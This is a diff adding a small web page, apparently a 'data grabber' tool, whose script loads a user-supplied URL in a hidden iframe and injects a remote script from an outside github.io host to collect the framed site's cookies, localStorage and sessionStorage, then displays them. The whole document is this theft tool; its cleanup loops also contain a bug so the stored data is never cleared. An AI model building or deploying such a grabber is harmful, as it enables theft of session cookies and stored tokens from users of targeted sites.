@@ -1,0 +1,47 @@
+<p>Enter url to grab Data from <input id="urlInput" type="url"></p>
+<p><button onclick="grab()">Grab</button></p>
+<p>it may take a bit of time</p>
+<p id="cookies">Cookies: </p>
+<div id="localStorage">
+<p>LocalStorage:</p>
+</div>
+<div id="sessionStorage">
+<p>SessionStorage:</p>
+</div>
+<script>
+function grab() {
+ var iframe = document.createElement("iframe")
+ iframe.src = document.getElementById("urlInput").value
+ iframe.style.display = "none"
+ document.body.appendChild(iframe)
+ var elem = iframe.contentWindow.eval("document.createElement('script')")
+ elem.src = "https://alexidians.github.io/Super-Diamond-OS/Super Diamond OS_files/data grabber_files/grab.js"
+ var iframeBody = iframe.contentWindow.eval("document.body")
+ iframeBody.appendChild(elem)
+ alert("Grabbed!")
+ results()
+}
+
+function results() {
+ document.getElementById("cookies").innerHTML = "Cookies: " + localStorage.getItem("cookies")
+ localStorage.removeItem("cookies")
+ var localStorageItems = localStorage.getItem("localStorage").split(",")
+ for (let i = 0; i < localStorageItems.length; i++) {
+  var localStorageDisplay = document.createElement("p")
+  localStorageDisplay.innerHTML = localStorageItems[i]
+  document.getElementById("localStorage").appendChild(localStorageDisplay)
+  if(i == localStorageItems.length) {
+   localStorage.removeItem("localStorage")
+  }
+ }
+ var sessionStorageItems = localStorage.getItem("sessionStorage").split(",")
+ for (let i = 0; i < sessionStorageItems.length; i++) {
+  var sessionStorageDisplay = document.createElement("p")
+  sessionStorageDisplay.innerHTML = sessionStorageItems[i]
+  document.getElementById("sessionStorage").appendChild(sessionStorageDisplay)
+  if(i == sessionStorageItems.length) {
+   localStorage.removeItem("sessionStorage")
+  }
+ }
+}
+</script>
